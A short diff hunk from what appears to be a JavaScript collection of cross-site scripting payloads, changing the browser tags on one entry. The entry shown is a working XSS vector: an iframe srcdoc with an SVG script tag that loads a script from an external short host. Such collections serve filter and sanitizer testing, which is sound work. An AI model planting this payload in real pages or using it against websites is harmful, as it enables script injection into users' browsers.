@@ -52,7 +52,7 @@ const PAYLOADS = [
     },
     {
         html: '<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">',
-        tags: [TAGS.firefox, TAGS.scripts],
+        tags: [TAGS.scripts],
         author: null,
     },
     {
